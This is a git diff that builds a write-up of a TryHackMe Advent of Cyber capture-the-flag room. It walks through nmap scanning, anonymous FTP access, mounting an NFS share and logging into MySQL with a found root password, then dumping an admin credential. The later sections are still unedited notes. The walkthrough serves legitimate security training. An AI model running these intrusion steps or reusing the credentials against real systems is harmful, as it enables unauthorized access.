@@ -1,6 +1,17 @@
-nmap 
+# Advent of Cyber  [2019] - Day 11
+> 4lch3my | June 14, 2023
+-------------------
+#### Elf Applications
+#### [Room Link](https://tryhackme.com/room/25daysofchristmas)
 
-nmap -sC -sV -A 10.10.35.99
+##### Deploy the machine and connect to our network
+  Deploy the machine with the Start Machine button, also either deploy your Attack Box OR Connect to OpenVPN and deploy your personal KALI machine. <br>
+
+  To start, I use [nmap] for scanning the machine, which is default option on the personal Kali install I have. We start with a basic command
+  ` nmap -sC -sV -A -v MACHINE_IP `
+  The -sC flag runs scripts against open ports as well to determine if there are external/common vulnerabilities that we can use outright. The -sV probes all open ports it finds to determine if we can get the service/version information. -v outputs in verbose mode, so we can follow along with the commands and enumeration.
+  In our NMAP results we get:
+```
 Starting Nmap 7.60 ( https://nmap.org ) at 2023-06-13 01:23 BST
 Nmap scan report for ip-10-10-35-99.eu-west-1.compute.internal (10.10.35.99)
 Host is up (0.00038s latency).
@@ -12,7 +23,7 @@ PORT     STATE SERVICE VERSION
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
-|      Connected to 10.10.240.134
+|      Connected to MACHINE_IP
 |      Logged in as ftp
 |      TYPE: ASCII
 |      No session bandwidth limit
@@ -72,30 +83,129 @@ Service Info: OS: Unix
 
 TRACEROUTE
 HOP RTT     ADDRESS
-1   0.38 ms ip-10-10-35-99.eu-west-1.compute.internal (10.10.35.99)
+1   0.38 ms ip-MACHINE_IP.eu-west-1.compute.internal (10.10.35.99)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 22.07 seconds
+```
 
+Wow. We have a bunch of services running on this machine. Let's look at the one by one.
 
+##### FTP
 
+As we can see in our nmap scan, we have the `ftp-anon` enabled on this machines, what refers to  "log-in" with no known password. 
 
-ftp
+```
+ftp-anon: Anonymous FTP login allowed (FTP code 230)
+```
+Let's try to login to the FTP server.
+When prompted, we can leave the password field blank and hit [ENTER]. 
+
+```
+root@ip-10-10-148-9:~# ftp MACHINE_IP
+Connected to MACHINE_IP.
+220 (vsFTPd 3.0.2)
+Name (MACHINE_IP:root): Anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+```
+
+Time to list all the files with the `ls` command:
+
+```
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxrwxrwx    1 0        0              39 Dec 10  2019 file.txt
+drwxr-xr-x    2 0        0               6 Nov 04  2019 pub
+d-wx-wx--x    2 14       50              6 Nov 04  2019 uploads
+-rw-r--r--    1 0        0             224 Nov 04  2019 welcome.msg
+226 Directory send OK.
+```
+
+After looking at the folders, there is nothing of interest for us, so let's grab `file.txt` & `welcome.msg` with the `get` command to move them to our personal machine:
+
+```
+ftp> get file.txt
+local: file.txt remote: file.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for file.txt (39 bytes).
+226 Transfer complete.
+39 bytes received in 0.00 secs (82.0818 kB/s)
+ftp> get welcome.msg
+local: welcome.msg remote: welcome.msg
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for welcome.msg (224 bytes).
+226 Transfer complete.
+224 bytes received in 0.00 secs (150.1373 kB/s)
+``` 
+
+Looking at the `welcome.msg` file, we see nothing of interest, it is simply a file to show us some default data about the ftp page where we logged into.
+
+IMAGE
+
+But, if we look at the `file.txt` file, we have some usefull information for further enumeration on this machine.
 
 
 
 nfs
 
-root@ip-10-10-240-134:~# showmount -e 10.10.35.99
-Export list for 10.10.35.99:
+root@ip-10-10-240-134:~# showmount -e MACHINE_IP
+Export list for MACHINE_IP:
 /opt/files *
 
-mount 10.10.35.99:/opt/files /root/Desktop/
+mount MACHINE_IP:/opt/files /root/Desktop/
 
 sql
 
 if no sql reader, install: mysql-client-core-5.7
 
-mysql -u root -pff912ABD* -h 10.10.35.99
+mysql -u root -pff912ABD* -h MACHINE_IP
 
 (-pPassword, yes! -p is WITH password!, all one word)
+
+mysql> SELECT VERSION(), CURRENT_DATE;
++-----------+--------------+
+| VERSION() | CURRENT_DATE |
++-----------+--------------+
+| 5.7.28    | 2023-06-14   |
++-----------+--------------+
+1 row in set (0.00 sec)
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| data               |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+
+mysql> use data;
+Reading table information for completion of table and column names
+
+
+mysql> show tables;
++----------------+
+| Tables_in_data |
++----------------+
+| USERS          |
++----------------+
+1 row in set (0.00 sec)
+
+
+
+mysql> SELECT * FROM USERS;
++-------+--------------+
+| name  | password     |
++-------+--------------+
+| admin | bestpassword |
++-------+--------------+
+1 row in set (0.00 sec)
+
+mysql> 
